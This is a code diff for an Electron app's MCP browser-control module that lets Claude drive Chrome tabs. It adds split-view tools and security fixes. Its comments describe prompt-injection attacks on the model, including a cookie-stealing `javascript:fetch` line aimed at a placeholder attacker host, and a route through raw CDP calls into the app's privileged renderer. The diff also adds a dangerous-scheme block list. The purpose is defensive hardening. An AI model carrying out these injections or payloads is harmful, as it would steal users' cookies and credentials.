@@ -83,6 +83,60 @@ function profileDir() {
   return path.join(app.getPath('userData'), 'chrome-profile');
 }
 
+// ── URL scheme allowlist (anti-prompt-injection / anti-RCE) ───────────────
+// A prompt-injected tool result could trick Claude into asking us to navigate
+// to `javascript:fetch('http://attacker/?'+document.cookie)` — Puppeteer's
+// page.goto('javascript:...') executes the script in the CURRENT page's
+// origin, leaking cookies/credentials. Same risk for `data:text/html,<script>`,
+// `file://`, `vbscript:`, `ms-msdt:`, `chrome:` (non-allowlisted), etc.
+//
+// The auth boundary is the bearer token, but the model is allowed to call us
+// — so the model itself is the attack surface. Validate scheme on input.
+const _SAFE_URL_SCHEMES = new Set(['http:', 'https:', 'about:']);
+// Bypass pattern: strings like "javascript: void(0)" with a space, or with
+// embedded \t / \n / unicode whitespace, can confuse `new URL()` into returning
+// no protocol (unparseable). The previous version then fell into the
+// "bare domain" branch and returned the string unchanged. Fix: strip ALL
+// whitespace first, then check the dangerous-prefix list BEFORE parsing.
+const _DANGEROUS_URL_PREFIXES = [
+  'javascript:', 'data:', 'file:', 'vbscript:', 'ms-msdt:',
+  'mhtml:', 'view-source:', 'chrome-extension:',
+];
+function _safeNavUrl(url) {
+  if (typeof url !== 'string' || !url.trim()) {
+    throw new Error('url required (string, non-empty)');
+  }
+  const trimmed = url.trim();
+  // Allow `about:blank` and `about:srcdoc` literally
+  if (trimmed === 'about:blank' || trimmed === 'about:srcdoc') return trimmed;
+  // Dangerous-prefix check runs FIRST — strip ALL whitespace (tabs, newlines,
+  // unicode spaces) before comparing so `"javascript: void(0)"` and friends
+  // can't slip through via the "unparseable URL" branch.
+  const sanitized = trimmed.replace(/\s+/g, '').toLowerCase();
+  for (const bad of _DANGEROUS_URL_PREFIXES) {
+    if (sanitized.startsWith(bad)) {
+      throw new Error(`Refusing to navigate: scheme not allowed (${bad}). Allowed: http(s), about:.`);
+    }
+  }
+  // Allow chrome://<allowlisted> — narrowed further by openInternalPage()
+  if (sanitized.startsWith('chrome:')) return trimmed;
+  let parsed;
+  try { parsed = new URL(trimmed); }
+  catch (_) {
+    // Unparseable AFTER dangerous-prefix check passed: must be bare-domain
+    // or relative. Safe to return as-is for page.goto to resolve.
+    return trimmed;
+  }
+  if (!_SAFE_URL_SCHEMES.has(parsed.protocol)) {
+    throw new Error(
+      `Refusing to navigate: scheme "${parsed.protocol}" not allowed. ` +
+      `Allowed: http:, https:, about:. (javascript:, data:, file:, vbscript:, ` +
+      `ms-msdt: are blocked to prevent prompt-injected RCE.)`
+    );
+  }
+  return trimmed;
+}
+
 // Works across Puppeteer versions — `isConnected()` was a method in v21-,
 // `connected` is a property in v22+. Don't trust either to exist.
 function _isBrowserAlive() {
@@ -180,6 +234,13 @@ async function status() {
   let version = null;
   try { version = await _browser.version(); } catch (_) {}
   const pages = await _browser.pages();
+  // Surface split-view info inline — saves a second tool call when Claude is
+  // checking the layout before driving panes.
+  let splitView = null;
+  try {
+    const sv = await splitState();
+    splitView = sv.active ? sv : null;
+  } catch (_) { /* ignore */ }
   return {
     running:      true,
     mode:         'attached',
@@ -192,6 +253,7 @@ async function status() {
       url:   p.url(),
       title: await p.title().catch(() => ''),
     }))),
+    splitView,
   };
 }
 
@@ -253,13 +315,54 @@ async function _activePage() {
   return best;
 }
 
+// SECURITY — only return pages whose URL passes the browseable filter. This
+// blocks an MCP caller from targeting the CCM main renderer (which has
+// `electronAPI` preload access) via { targetId: ... } + chrome_runtime_eval.
+// Without this filter, a prompt-injected tool result could enumerate targets
+// via chrome_cdp_raw{Target.getTargets}, pick the CCM UI's targetId, then run
+// arbitrary JS in privileged renderer context — full IPC abuse follows.
 async function _pageById(targetId) {
+  if (typeof targetId !== 'string' || !targetId.trim()) return null;
   const browser = await _ensureBrowser();
   const pages = await browser.pages();
-  return pages.find(p => p.target()._targetId === targetId) || null;
+  const match = pages.find(p => p.target()._targetId === targetId);
+  if (!match) return null;
+  if (!_isBrowserableUrl(match.url())) {
+    throw new Error(
+      'Refused: targetId ' + targetId + ' points at a non-browseable page ' +
+      '(CCM app UI, DevTools, or chrome-extension://). Only browser-panel tabs ' +
+      'are addressable via MCP tools.'
+    );
+  }
+  return match;
 }
 
 // ── Target / tab operations ────────────────────────────────────────────────
+
+// Shared URL-match resolver used by targetList() and splitState(). Returns
+// { leftTargetId, rightTargetId } given a page list and the renderer's split
+// state. Multiple same-URL tabs: first-match-wins per pane, and a tab claimed
+// by `left` is excluded from `right` so identical-URL twin tabs don't collide.
+// Was previously inlined twice with subtly different "claimed" tracking —
+// extraction collapses the duplication into one source of truth.
+function _resolvePanesByUrl(pages, split) {
+  if (!split || !split.active) return { leftTargetId: null, rightTargetId: null };
+  let leftTargetId = null;
+  let rightTargetId = null;
+  for (const p of pages) {
+    if (leftTargetId && rightTargetId) break;
+    const url = p.url();
+    if (!_isBrowserableUrl(url)) continue;
+    const tid = p.target()._targetId;
+    if (split.leftUrl && url === split.leftUrl && !leftTargetId) {
+      leftTargetId = tid;
+    } else if (split.rightUrl && url === split.rightUrl && !rightTargetId && tid !== leftTargetId) {
+      rightTargetId = tid;
+    }
+  }
+  return { leftTargetId, rightTargetId };
+}
+
 // targetList returns ONLY browser-panel tabs, filtered to exclude the CCM
 // app UI and other Electron internals. Each tab includes:
 //   - lastActivated: unix-ms timestamp of our last bringToFront/navigate
@@ -267,14 +370,28 @@ async function _pageById(targetId) {
 //   - attached: true if this is the tab _activePage() last picked (= the tab
 //               every chrome_* tool is currently driving). Disambiguates
 //               identical-URL twin tabs.
+//   - pane: 'left' / 'right' / null — Phase 15 split-view position
+//   - pid + viewId — Phase 17 per-tab OS introspection
 async function targetList() {
   const browser = await _ensureBrowser();
   const pages   = await browser.pages();
+  const split   = global.ccmSplitState;
+  const { leftTargetId, rightTargetId } = _resolvePanesByUrl(pages, split);
+  // Phase 17 — view→PID map from main process for memory/CPU introspection.
+  const viewPids = (typeof global.ccmBrowserViewPids === 'function')
+    ? global.ccmBrowserViewPids() : [];
+  const claimedViewIds = new Set();
+
   const out = [];
   for (const p of pages) {
     const url = p.url();
     if (!_isBrowserableUrl(url)) continue;
     const id = p.target()._targetId;
+    const pane = id === leftTargetId  ? 'left'
+              : id === rightTargetId ? 'right'
+              : null;
+    const vp = viewPids.find(v => v.url === url && !claimedViewIds.has(v.viewId));
+    if (vp) claimedViewIds.add(vp.viewId);
     out.push({
       id,
       url,
@@ -282,6 +399,9 @@ async function targetList() {
       type:          p.target().type(),
       lastActivated: _targetActivations.get(id) || null,
       attached:      id === _attachedTargetId,
+      pane,
+      pid:           vp?.pid    ?? null,
+      viewId:        vp?.viewId ?? null,
     });
   }
   // Sort: attached first, then most-recently-activated, then everything else
@@ -289,7 +409,121 @@ async function targetList() {
     if (a.attached !== b.attached) return a.attached ? -1 : 1;
     return (b.lastActivated || 0) - (a.lastActivated || 0);
   });
-  return { tabs: out, count: out.length, attachedId: _attachedTargetId };
+  return {
+    tabs:        out,
+    count:       out.length,
+    attachedId:  _attachedTargetId,
+    splitActive: !!(split && split.active),
+    splitLeftId:  leftTargetId,
+    splitRightId: rightTargetId,
+  };
+}
+
+// ── Split-view state (Phase 15) ────────────────────────────────────────────
+// Lets the MCP caller (Claude) drive both panes of CCM's split-view browser
+// in the same turn. Renderer mirrors its state to global.ccmSplitState via
+// IPC; we resolve the renderer's viewIds/URLs to CDP targetIds so callers
+// can pass `targetId:` to observe / step / click_ref / type_ref / etc.
+//
+// Returns shape:
+//   { active: false }                                            (no split)
+//   { active: true, ratio, left: {viewId,url,title,targetId},   (split on)
+//                          right: {viewId,url,title,targetId} }
+//
+// Use case — "research in one pane, notes in the other":
+//   1. chrome_split_state                                → { left:{targetId:A}, right:{targetId:B} }
+//   2. chrome_observe { targetId: A }                    → read research page
+//   3. chrome_step { targetId: B, action:'type', target:'note input', value:'finding: ...' }
+//   4. chrome_step { targetId: A, action:'click', target:'next page' }
+// Both panes driven from one Claude turn. No active-tab flipping required.
+// Phase 16 — Claude-controllable split-view. Each of these calls into
+// global.ccmBrowserSplit (installed by main.js) which webContents.sends a
+// command to the renderer; the renderer mutates _browser state and replies
+// via the reqId pattern. After the round-trip we resolve splitState() so
+// the caller gets the full CDP-target-bearing layout back in one response.
+function _assertSplitBridge() {
+  if (!global.ccmBrowserSplit) {
+    throw new Error(
+      'split-view bridge not initialized — Electron main process is still booting, ' +
+      'or CCM was launched without the Browser panel infrastructure. Retry shortly.'
+    );
+  }
+}
+
+async function splitEnable({ leftUrl, rightUrl, ratio } = {}) {
+  _assertSplitBridge();
+  // Validate URLs through the same allowlist as direct navigation so a
+  // prompt-injected `javascript:` URL can't sneak in via the new tool.
+  if (leftUrl)  leftUrl  = _safeNavUrl(leftUrl);
+  if (rightUrl) rightUrl = _safeNavUrl(rightUrl);
+  if (ratio !== undefined && (typeof ratio !== 'number' || ratio < 0.15 || ratio > 0.85)) {
+    throw new Error('ratio must be a number between 0.15 and 0.85');
+  }
+  const r = await global.ccmBrowserSplit.enable({ leftUrl, rightUrl, ratio });
+  if (!r?.ok) {
+    return { ok: false, error: r?.error || 'split enable failed' };
+  }
+  // Give the renderer a beat to push its new state up via setSplitState
+  // (refreshChrome → _syncBrowserSplitState fires synchronously, but the IPC
+  // round-trip needs one event-loop turn to settle).
+  await new Promise(res => setTimeout(res, 80));
+  const state = await splitState();
+  return { ok: true, ...state, applied: r };
+}
+
+async function splitDisable() {
+  _assertSplitBridge();
+  const r = await global.ccmBrowserSplit.disable();
+  if (!r?.ok) return { ok: false, error: r?.error || 'split disable failed' };
+  await new Promise(res => setTimeout(res, 50));
+  return { ok: true, active: false };
+}
+
+async function splitSwap() {
+  _assertSplitBridge();
+  const r = await global.ccmBrowserSplit.swap();
+  if (!r?.ok) return { ok: false, error: r?.error || 'split swap failed' };
+  await new Promise(res => setTimeout(res, 80));
+  const state = await splitState();
+  return { ok: true, ...state, applied: r };
+}
+
+async function splitSetRatio({ ratio } = {}) {
+  _assertSplitBridge();
+  if (typeof ratio !== 'number' || ratio < 0.15 || ratio > 0.85) {
+    throw new Error('ratio (number 0.15 to 0.85) required');
+  }
+  const r = await global.ccmBrowserSplit.setRatio(ratio);
+  if (!r?.ok) return { ok: false, error: r?.error || 'split set-ratio failed' };
+  await new Promise(res => setTimeout(res, 50));
+  const state = await splitState();
+  return { ok: true, ratio: state.ratio, ...state };
+}
+
+async function splitState() {
+  const s = global.ccmSplitState;
+  if (!s || !s.active) return { active: false };
+  const browser = await _ensureBrowser();
+  const pages = await browser.pages();
+  // Same URL-match resolver as targetList — single source of truth so the
+  // two functions can't disagree about which CDP target each pane is.
+  const { leftTargetId, rightTargetId } = _resolvePanesByUrl(pages, s);
+  return {
+    active: true,
+    ratio: typeof s.ratio === 'number' ? s.ratio : 0.5,
+    left: {
+      viewId:   s.leftViewId  ?? null,
+      url:      s.leftUrl     ?? null,
+      title:    s.leftTitle   ?? null,
+      targetId: leftTargetId,
+    },
+    right: {
+      viewId:   s.rightViewId ?? null,
+      url:      s.rightUrl    ?? null,
+      title:    s.rightTitle  ?? null,
+      targetId: rightTargetId,
+    },
+  };
 }
 
 async function targetNewTab({ url } = {}) {
@@ -298,6 +532,7 @@ async function targetNewTab({ url } = {}) {
   // navigate the active panel to the given URL, OR ask the renderer (via a
   // future bridge) to create a new browser-panel tab. For now we navigate.
   if (!url) throw new Error('url required (cannot create new tabs from CDP in attached mode — open one in CCM\'s Browser panel first)');
+  url = _safeNavUrl(url);
   const page = await _activePage();
   await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 30000 }).catch(() => {});
   const id = page.target()._targetId;
@@ -331,9 +566,9 @@ async function targetActivateTab({ id } = {}) {
 }
 
 // ── Page operations ────────────────────────────────────────────────────────
-async function pageNavigate({ url, waitUntil = 'load', timeout = 30000, stabilize = true, stabilizeMs = 5000 } = {}) {
-  if (!url) throw new Error('url required');
-  const page = await _activePage();
+async function pageNavigate({ url, waitUntil = 'load', timeout = 30000, stabilize = true, stabilizeMs = 5000, targetId } = {}) {
+  url = _safeNavUrl(url);
+  const page = await _resolvePage(targetId);
   const resp = await page.goto(url, { waitUntil, timeout });
   _targetActivations.set(page.target()._targetId, Date.now());
   const out = {
@@ -348,14 +583,14 @@ async function pageNavigate({ url, waitUntil = 'load', timeout = 30000, stabiliz
   return out;
 }
 
-async function pageReload({ waitUntil = 'load', timeout = 30000 } = {}) {
-  const page = await _activePage();
+async function pageReload({ waitUntil = 'load', timeout = 30000, targetId } = {}) {
+  const page = await _resolvePage(targetId);
   await page.reload({ waitUntil, timeout });
   return { ok: true, url: page.url() };
 }
 
-async function pageScreenshot({ fullPage = false, quality = 75 } = {}) {
-  const page = await _activePage();
+async function pageScreenshot({ fullPage = false, quality = 75, targetId } = {}) {
+  const page = await _resolvePage(targetId);
   const buf = await page.screenshot({
     type:     'jpeg',
     quality,
@@ -370,8 +605,8 @@ async function pageScreenshot({ fullPage = false, quality = 75 } = {}) {
   };
 }
 
-async function pagePdf({ landscape = false, printBackground = true } = {}) {
-  const page = await _activePage();
+async function pagePdf({ landscape = false, printBackground = true, targetId } = {}) {
+  const page = await _resolvePage(targetId);
   const buf = await page.pdf({ landscape, printBackground });
   return {
     base64:    buf.toString('base64'),
@@ -380,16 +615,16 @@ async function pagePdf({ landscape = false, printBackground = true } = {}) {
   };
 }
 
-async function pageWaitForLoad({ timeout = 30000 } = {}) {
-  const page = await _activePage();
+async function pageWaitForLoad({ timeout = 30000, targetId } = {}) {
+  const page = await _resolvePage(targetId);
   await page.waitForNavigation({ timeout, waitUntil: 'load' }).catch(() => {});
   return { ok: true, url: page.url() };
 }
 
 // ── Runtime — the swiss army knife ─────────────────────────────────────────
-async function runtimeEval({ expression, awaitPromise = true } = {}) {
+async function runtimeEval({ expression, awaitPromise = true, targetId } = {}) {
   if (!expression) throw new Error('expression required');
-  const page = await _activePage();
+  const page = await _resolvePage(targetId);
   try {
     const result = await page.evaluate(awaitPromise ? `(async () => (${expression}))()` : expression);
     // result might be undefined / circular — sanitize
@@ -406,9 +641,9 @@ async function runtimeEval({ expression, awaitPromise = true } = {}) {
 //
 // Wrap pattern: `(async () => { CODE; return ... })()` so you can `await`,
 // declare variables, run for-loops, and optionally return a value at the end.
-async function runtimeRun({ code } = {}) {
+async function runtimeRun({ code, targetId } = {}) {
   if (!code) throw new Error('code (statement block) required');
-  const page = await _activePage();
+  const page = await _resolvePage(targetId);
   try {
     const result = await page.evaluate(`(async () => { ${code} })()`);
     return { ok: true, result };
@@ -418,9 +653,9 @@ async function runtimeRun({ code } = {}) {
 }
 
 // ── DOM ────────────────────────────────────────────────────────────────────
-async function domQuery({ selector } = {}) {
+async function domQuery({ selector, targetId } = {}) {
   if (!selector) throw new Error('selector required');
-  const page = await _activePage();
+  const page = await _resolvePage(targetId);
   const handle = await page.$(selector);
   if (!handle) return { found: false };
   const box = await handle.boundingBox();
@@ -433,9 +668,9 @@ async function domQuery({ selector } = {}) {
   };
 }
 
-async function domQueryAll({ selector, limit = 50 } = {}) {
+async function domQueryAll({ selector, limit = 50, targetId } = {}) {
   if (!selector) throw new Error('selector required');
-  const page = await _activePage();
+  const page = await _resolvePage(targetId);
   return page.evaluate((sel, lim) => {
     return Array.from(document.querySelectorAll(sel)).slice(0, lim).map((el, i) => {
       const r = el.getBoundingClientRect();
@@ -449,9 +684,9 @@ async function domQueryAll({ selector, limit = 50 } = {}) {
   }, selector, limit);
 }
 
-async function domGetText({ selector } = {}) {
+async function domGetText({ selector, targetId } = {}) {
   if (!selector) throw new Error('selector required');
-  const page = await _activePage();
+  const page = await _resolvePage(targetId);
   return page.evaluate(sel => {
     const el = document.querySelector(sel);
     return el ? (el.innerText || el.textContent || '') : null;
@@ -461,8 +696,8 @@ async function domGetText({ selector } = {}) {
 // ── Input ──────────────────────────────────────────────────────────────────
 // Optional auto-stabilize (off by default for legacy compat). Set
 // stabilize:true on any call to wait for the page to settle before returning.
-async function inputClick({ selector, x, y, stabilize = false, stabilizeMs = 5000 } = {}) {
-  const page = await _activePage();
+async function inputClick({ selector, x, y, stabilize = false, stabilizeMs = 5000, targetId } = {}) {
+  const page = await _resolvePage(targetId);
   let result;
   if (selector) {
     await page.click(selector);
@@ -479,9 +714,9 @@ async function inputClick({ selector, x, y, stabilize = false, stabilizeMs = 500
   return result;
 }
 
-async function inputType({ selector, text, delay = 20, stabilize = false, stabilizeMs = 5000 } = {}) {
+async function inputType({ selector, text, delay = 20, stabilize = false, stabilizeMs = 5000, targetId } = {}) {
   if (typeof text !== 'string') throw new Error('text required');
-  const page = await _activePage();
+  const page = await _resolvePage(targetId);
   if (selector) await page.focus(selector);
   await page.keyboard.type(text, { delay });
   const result = { ok: true, typed: text.length + ' chars' };
@@ -491,9 +726,9 @@ async function inputType({ selector, text, delay = 20, stabilize = false, stabil
   return result;
 }
 
-async function inputKey({ key, modifiers = [], stabilize = false, stabilizeMs = 5000 } = {}) {
+async function inputKey({ key, modifiers = [], stabilize = false, stabilizeMs = 5000, targetId } = {}) {
   if (!key) throw new Error('key required');
-  const page = await _activePage();
+  const page = await _resolvePage(targetId);
   for (const m of modifiers) await page.keyboard.down(m);
   await page.keyboard.press(key);
   for (const m of modifiers.slice().reverse()) await page.keyboard.up(m);
@@ -504,8 +739,8 @@ async function inputKey({ key, modifiers = [], stabilize = false, stabilizeMs = 
   return result;
 }
 
-async function inputScroll({ amount = 600, direction = 'down' } = {}) {
-  const page = await _activePage();
+async function inputScroll({ amount = 600, direction = 'down', targetId } = {}) {
+  const page = await _resolvePage(targetId);
   const dy = direction === 'up' ? -amount : amount;
   await page.evaluate(d => window.scrollBy({ top: d, behavior: 'smooth' }), dy);
   return { ok: true };
@@ -521,9 +756,9 @@ async function inputScroll({ amount = 600, direction = 'down' } = {}) {
 //   2. Wait one frame for layout to settle
 //   3. Verify the element's rect is now inside the viewport
 //   4. Click at its geometric center (Puppeteer's page.click handles that)
-async function domClick({ selector } = {}) {
+async function domClick({ selector, targetId } = {}) {
   if (!selector) throw new Error('selector required');
-  const page = await _activePage();
+  const page = await _resolvePage(targetId);
   // Scroll the target into the visible viewport
   const visible = await page.evaluate(sel => {
     const el = document.querySelector(sel);
@@ -589,11 +824,11 @@ async function cmFocus() {
 // CM6's default keymap binds Ctrl+G to "open goto line dialog". We focus,
 // fire the chord, type the line number, press Enter. Works on Lovable.dev,
 // CodeSandbox, and any vanilla CM6 install.
-async function cmGotoLine({ line } = {}) {
+async function cmGotoLine({ line, targetId } = {}) {
   if (typeof line !== 'number' || line < 1) throw new Error('line (positive integer) required');
   const focusResult = await cmFocus();
   if (!focusResult.ok) return focusResult;
-  const page = await _activePage();
+  const page = await _resolvePage(targetId);
   // Open the goto-line dialog (CM6 default: Ctrl+G)
   await page.keyboard.down('Control');
   await page.keyboard.press('KeyG');
@@ -614,10 +849,10 @@ async function cmGotoLine({ line } = {}) {
 //                                          auto-pairing of brackets/quotes)
 //   5. Save                               (Ctrl+S, configurable)
 // Replaces the 30+ keystroke dance from the real session with one call.
-async function cmReplaceLine({ line, content, save = true } = {}) {
+async function cmReplaceLine({ line, content, save = true, targetId } = {}) {
   if (typeof line !== 'number' || line < 1) throw new Error('line (positive integer) required');
   if (typeof content !== 'string') throw new Error('content (replacement string) required');
-  const page = await _activePage();
+  const page = await _resolvePage(targetId);
   // 1+2 — focus + goto line
   const goto = await cmGotoLine({ line });
   if (!goto.ok) return goto;
@@ -664,10 +899,14 @@ async function cmEnsureEditor() {
   const page = await _activePage();
   const hasEditor = await page.evaluate(() => !!document.querySelector('.cm-content'));
   if (hasEditor) return { ok: true, alreadyMounted: true, url: page.url() };
-  // Try to re-navigate with ?view=codeEditor
+  // Try to re-navigate with ?view=codeEditor — only allowed if current URL
+  // is itself http(s) (which it must be to host an editor; defense in depth).
   let target;
   try {
     const u = new URL(page.url());
+    if (u.protocol !== 'http:' && u.protocol !== 'https:') {
+      return { ok: false, error: 'refuse to re-navigate non-http(s) page (' + u.protocol + ')' };
+    }
     u.searchParams.set('view', 'codeEditor');
     target = u.toString();
   } catch (_) {
@@ -696,12 +935,20 @@ async function cmEnsureEditor() {
 // it assumes the current page (e.g. a Lovable project) understands the file
 // param. If the host doesn't, search-code via chrome_input_type is still the
 // fallback.
-async function cmOpenAtLine({ file, line } = {}) {
+async function cmOpenAtLine({ file, line, targetId } = {}) {
   if (!file || typeof file !== 'string') throw new Error('file (path string) required');
-  const page = await _activePage();
+  // Sanity: refuse paths with control chars or scheme-looking prefixes that
+  // could be smuggled into search params by a prompt-injected tool result.
+  if (/[\x00-\x1f]/.test(file) || /^[a-z]+:/i.test(file)) {
+    throw new Error('file: control chars or URL scheme not allowed (got: ' + file.slice(0, 40) + ')');
+  }
+  const page = await _resolvePage(targetId);
   let target;
   try {
     const u = new URL(page.url());
+    if (u.protocol !== 'http:' && u.protocol !== 'https:') {
+      return { ok: false, error: 'refuse to navigate non-http(s) page (' + u.protocol + ')' };
+    }
     u.searchParams.set('view', 'codeEditor');
     u.searchParams.set('file', file);
     if (typeof line === 'number' && line > 0) u.searchParams.set('line', String(line));
@@ -735,7 +982,7 @@ async function cmOpenAtLine({ file, line } = {}) {
 // insert/delete), line numbers stay valid in any order.
 //
 // Returns { ok, edits: [{file,line,ok,error?}], savedFiles: [...] }
-async function cmEditAtomic({ edits = [], save = true, ensureEditor = true } = {}) {
+async function cmEditAtomic({ edits = [], save = true, ensureEditor = true, targetId } = {}) {
   if (!Array.isArray(edits) || edits.length === 0) {
     throw new Error('edits (non-empty array of {line, content, file?}) required');
   }
@@ -746,7 +993,7 @@ async function cmEditAtomic({ edits = [], save = true, ensureEditor = true } = {
 
   const saveCurrent = async () => {
     if (!save || !needsSave) return;
-    const page = await _activePage();
+    const page = await _resolvePage(targetId);
     await page.keyboard.down('Control');
     await page.keyboard.press('KeyS');
     await page.keyboard.up('Control');
@@ -800,10 +1047,22 @@ async function cmEditAtomic({ edits = [], save = true, ensureEditor = true } = {
 // Babel plugin). On click, captures `{ tag, text, classes, source, chain }`
 // to `window.__pickerResult` and sets `window.__pickerDone = true`.
 // pickerCapture polls those globals and returns the captured result.
+// Picker overlay element identity is tracked via a closure-scoped Set, NOT
+// via a public data-* attribute. Previously a hostile page could spam
+// `data-picker="1"` on every element and the move/click handlers would
+// early-return for everything — a DoS against the user's click. Now the
+// filter compares element identity against ownNodes (which the page can't
+// see), so spamming attributes does nothing.
 const PICKER_SCRIPT = `(() => {
-  document.querySelectorAll('[data-picker]').forEach(e => e.remove());
+  // Clean up any prior picker overlays (legacy data-picker or new sentinel)
+  document.querySelectorAll('[data-ccm-picker-overlay]').forEach(e => e.remove());
   window.__pickerResult = null;
   window.__pickerDone = false;
+  const ownNodes = new Set();          // closure-scoped — pages cannot poison
+  const isOurs = n => {
+    while (n && n !== document.body) { if (ownNodes.has(n)) return true; n = n.parentNode; }
+    return false;
+  };
   const findFiber = el => {
     const k = Object.keys(el).find(k => k.startsWith('__reactFiber$'));
     return k ? el[k] : null;
@@ -832,7 +1091,8 @@ const PICKER_SCRIPT = `(() => {
     return chain;
   };
   const overlay = document.createElement('div');
-  overlay.dataset.picker = '1';
+  overlay.setAttribute('data-ccm-picker-overlay', '1');  // for cleanup-by-selector fallback
+  ownNodes.add(overlay);
   Object.assign(overlay.style, {
     position: 'fixed', pointerEvents: 'none', border: '2px solid #00e5ff',
     background: 'rgba(0,229,255,0.18)', zIndex: 2147483647, transition: 'all 60ms',
@@ -840,7 +1100,8 @@ const PICKER_SCRIPT = `(() => {
   });
   document.body.appendChild(overlay);
   const tip = document.createElement('div');
-  tip.dataset.picker = '1';
+  tip.setAttribute('data-ccm-picker-overlay', '1');
+  ownNodes.add(tip);
   Object.assign(tip.style, {
     position: 'fixed', pointerEvents: 'none', background: '#0a0a0a',
     color: '#00e5ff', padding: '6px 10px',
@@ -850,7 +1111,8 @@ const PICKER_SCRIPT = `(() => {
   });
   document.body.appendChild(tip);
   const banner = document.createElement('div');
-  banner.dataset.picker = '1';
+  banner.setAttribute('data-ccm-picker-overlay', '1');
+  ownNodes.add(banner);
   banner.textContent = 'PICKER ACTIVE — hover & click any element';
   Object.assign(banner.style, {
     position: 'fixed', top: '10px', left: '50%', transform: 'translateX(-50%)',
@@ -861,7 +1123,7 @@ const PICKER_SCRIPT = `(() => {
   document.body.appendChild(banner);
   const move = e => {
     const el = e.target;
-    if (el.dataset?.picker) return;
+    if (isOurs(el)) return;
     const r = el.getBoundingClientRect();
     Object.assign(overlay.style, {
       display: 'block', left: r.x + 'px', top: r.y + 'px',
@@ -878,7 +1140,7 @@ const PICKER_SCRIPT = `(() => {
   };
   const click = e => {
     const el = e.target;
-    if (el.dataset?.picker) return;
+    if (isOurs(el)) return;
     e.preventDefault(); e.stopPropagation();
     const f = findFiber(el);
     const s = f ? findSource(f) : null;
@@ -915,8 +1177,8 @@ async function pickerInstall() {
   } finally { try { await session.detach(); } catch (_) {} }
 }
 
-async function pickerCapture({ timeoutMs = 30000 } = {}) {
-  const page = await _activePage();
+async function pickerCapture({ timeoutMs = 30000, targetId } = {}) {
+  const page = await _resolvePage(targetId);
   const limitMs = Math.max(1000, Math.min(300000, timeoutMs));
   const t0 = Date.now();
   while (Date.now() - t0 < limitMs) {
@@ -935,7 +1197,8 @@ async function pickerCapture({ timeoutMs = 30000 } = {}) {
 async function pickerCancel() {
   const page = await _activePage();
   await page.evaluate(() => {
-    document.querySelectorAll('[data-picker]').forEach(e => e.remove());
+    // Clean both legacy and current sentinel — survives across versions
+    document.querySelectorAll('[data-picker], [data-ccm-picker-overlay]').forEach(e => e.remove());
     window.__pickerDone = true;
     window.__pickerResult = null;
   });
@@ -949,6 +1212,16 @@ async function pickerCancel() {
 // can do. Safety relies on the auth boundary, not method allowlisting.
 async function cdpRaw({ method, params = {}, sessionId } = {}) {
   if (!method) throw new Error('method required (e.g. "Page.captureScreenshot")');
+  // SECURITY — if params.targetId is specified, validate it through
+  // _pageById (which throws on non-browseable pages). Without this, an
+  // attacker could call chrome_cdp_raw{method:'Target.attachToTarget',
+  // params:{targetId:<CCM_UI>}} to attach a CDP session directly to CCM's
+  // own renderer process and execute arbitrary JS with electronAPI access.
+  // The _pageById filter is the auth boundary for targetId addressing —
+  // any CDP method that accepts a targetId must funnel through it.
+  if (params && typeof params === 'object' && typeof params.targetId === 'string') {
+    await _pageById(params.targetId); // throws if non-browseable
+  }
   // If caller passes a sessionId from chrome_frame_attach, route the call
   // into that frame's CDPSession instead of opening a fresh top-page one.
   if (sessionId) {
@@ -1244,7 +1517,16 @@ const _OBSERVE_PAGE_SCRIPT = `
 
   const nodes = [];
   const seen = new Set();
-  let refCounter = 0;
+  // Phase 14 fix - ref stability across observes:
+  // Previously refCounter reset to 0 each observe, so element A got ref=5
+  // in observe #1, then a different element got ref=5 in observe #2, and
+  // any cached ref=5 silently pointed at the wrong element. NOW we preserve
+  // the ref of any element that ALREADY has a valid data-ccm-ref from a
+  // prior observe, and only assign new numbers to newly-appeared elements.
+  // The counter is persisted on window.__ccmObserve.nextRef across calls.
+  const prev = window.__ccmObserve || {};
+  let nextRef = (typeof prev.nextRef === 'number' && prev.nextRef >= 1) ? prev.nextRef : 1;
+  const usedThisSweep = new Set();
 
   // Sweep interactive + landmark elements
   const candidates = Array.from(document.querySelectorAll(INTERACTIVE));
@@ -1255,11 +1537,20 @@ const _OBSERVE_PAGE_SCRIPT = `
   for (const el of candidates) {
     if (seen.has(el) || !visible(el)) continue;
     seen.add(el);
-    refCounter++;
-    el.setAttribute('data-ccm-ref', String(refCounter));
+    // Reuse a stable ref if this element already has one (numeric, not used
+    // earlier in this sweep). Otherwise allocate a new one from nextRef.
+    const existing = el.getAttribute('data-ccm-ref');
+    let ref;
+    if (existing && /^\\d+$/.test(existing) && !usedThisSweep.has(existing)) {
+      ref = parseInt(existing, 10);
+    } else {
+      ref = nextRef++;
+      el.setAttribute('data-ccm-ref', String(ref));
+    }
+    usedThisSweep.add(String(ref));
     const r = el.getBoundingClientRect();
     nodes.push({
-      ref:   refCounter,
+      ref,
       tag:   el.tagName.toLowerCase(),
       role:  role(el),
       name:  accName(el),
@@ -1304,7 +1595,9 @@ const _OBSERVE_PAGE_SCRIPT = `
   for (const n of nodes) {
     sig[n.ref] = n.role + '|' + n.name + '|' + (n.value||'') + '|' + n.state.join(',');
   }
-  window.__ccmObserve = { sig, ts: Date.now() };
+  // Persist nextRef so the next observe continues the counter instead of
+  // resetting (= stable refs across observes for surviving elements).
+  window.__ccmObserve = { sig, ts: Date.now(), nextRef };
 
   return {
     url: location.href,
@@ -1363,9 +1656,20 @@ const _OBSERVE_DELTA_SCRIPT = `
     return role + '|' + name + '|' + value + '|' + st.join(',');
   }
 
+  // Continue the ref sequence from the prior observe (don't restart counter).
+  const prevState = window.__ccmObserve || {};
+  let nextRef = (typeof prevState.nextRef === 'number' && prevState.nextRef >= 1)
+    ? prevState.nextRef
+    : (() => {
+        // Backfill from existing tagged refs if nextRef wasn't persisted yet
+        let m = 0;
+        for (const el of document.querySelectorAll('[data-ccm-ref]')) {
+          const v = +el.getAttribute('data-ccm-ref');
+          if (v > m) m = v;
+        }
+        return m + 1;
+      })();
   const tagged = Array.from(document.querySelectorAll('[data-ccm-ref]'));
-  let maxRef = 0;
-  for (const el of tagged) maxRef = Math.max(maxRef, +el.getAttribute('data-ccm-ref'));
 
   const currentRefs = new Set();
   const changed = [], appeared = [], disappeared = [];
@@ -1386,19 +1690,24 @@ const _OBSERVE_DELTA_SCRIPT = `
     const ref = +refStr;
     if (!currentRefs.has(ref)) disappeared.push(ref);
   }
-  // New interactives (no ref yet)
-  for (const el of document.querySelectorAll(INTERACTIVE)) {
